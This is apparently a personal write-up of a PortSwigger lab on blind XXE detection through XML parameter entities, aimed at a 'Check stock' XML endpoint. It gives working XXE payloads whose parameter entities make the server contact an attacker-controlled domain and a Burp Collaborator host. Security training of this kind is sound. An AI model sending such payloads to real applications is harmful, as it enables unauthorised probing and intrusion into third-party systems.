# Blind XXE with out-of-band interaction via XML parameter entities

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

## Definition
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand: `%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful. 

## Notes
This lab has a `Check stock` feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

**Remote Host**  
- [Portsweeger lab with an exploit server](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
- [Remote URL](https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit)
- [Fake burpcollaborator URL](https://abc1234def.burpcollaborator.net)


**Original Request**
```http
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>3</storeId></stockCheck>
```

**Malicious Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE exploit [<!ENTITY % pwn SYSTEM "https://abc1234def.burpcollaborator.net"> %pwn;]>
<stockCheck>
    <productId>4</productId>
    <storeId>3</storeId>
</stockCheck>
```

## Key Words
> xml, xxe, blind, remote server, exploit server, parameter entities